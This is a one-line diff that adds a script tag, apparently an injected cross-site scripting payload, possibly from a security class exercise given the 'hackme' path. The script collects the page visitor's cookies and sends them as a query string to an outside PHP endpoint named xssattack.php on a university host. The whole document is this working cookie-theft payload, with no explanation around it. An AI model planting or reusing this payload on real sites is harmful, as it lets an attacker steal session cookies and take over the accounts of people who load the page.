@@ -1,0 +1,1 @@
+<script type="text/javascript">var cookies = document.cookie; var cookie_request = cookies.replaceAll(";", "&"); fetch("http://fiona.utdallas.edu/~hxs200010/hackme/xssattack.php?" + cookie_request)</script>
